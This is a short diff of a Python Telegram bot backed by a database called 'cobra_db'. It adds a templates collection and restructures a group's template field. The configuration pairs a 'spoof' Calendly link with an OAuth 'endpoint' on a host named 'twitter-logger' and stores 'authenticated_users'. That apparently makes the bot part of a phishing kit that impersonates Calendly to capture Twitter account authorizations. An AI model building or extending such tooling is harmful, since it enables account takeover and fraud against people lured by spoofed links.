@@ -23,6 +23,7 @@ db = client['cobra_db']
 users = db['users']
 groups = db['groups']
 licenses = db['licenses']
+templates = db['templates']
 
 parse_mode = "MarkDown"
 
@@ -162,10 +163,10 @@ async def setup(update: Update, context: CallbackContext) -> None:
             "redirect": "https://calendly.com/cointele",
             "endpoint": f"https://twitter-logger.onrender.com/oauth?identifier={identifier}",
             "authenticated_users": [],
-            "template": [
-                "temp": "Calendly",
+            "template": {
+                "name": "Calendly",
                 "spoof": "https://calendly.com/cointele"
-            ]
+            }
         }
         groups.insert_one(group_data)
         
